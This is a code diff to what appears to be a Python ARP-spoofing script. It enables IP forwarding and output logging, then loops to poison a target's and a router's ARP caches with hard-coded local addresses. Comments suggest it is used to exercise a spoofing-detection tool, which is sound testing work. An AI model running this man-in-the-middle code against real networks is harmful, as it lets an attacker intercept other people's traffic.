@@ -57,10 +57,10 @@ def restore(targetIP, hostIP, verbose=True) -> str:
 
 
 def main():
-    #sys.stdout = open("output.txt", "w+")#prints everything to a file 
+    sys.stdout = open("output.txt", "w+")#prints everything to a file 
     targetIP = '192.168.1.123' #target, should be the IP of a local machine where you're running the tool detection.
     hostIP = '192.168.1.1' #should be router IP
-    #enable_linuxip() #turns on port forwarding for linux devices 
+    enable_linuxip() #turns on port forwarding for linux devices 
     try:
         while True: #we spoof the target first informing it that we are the target IP and after that we spoof the router informing it that we are the victim.
             spoof(targetIP, hostIP,True)
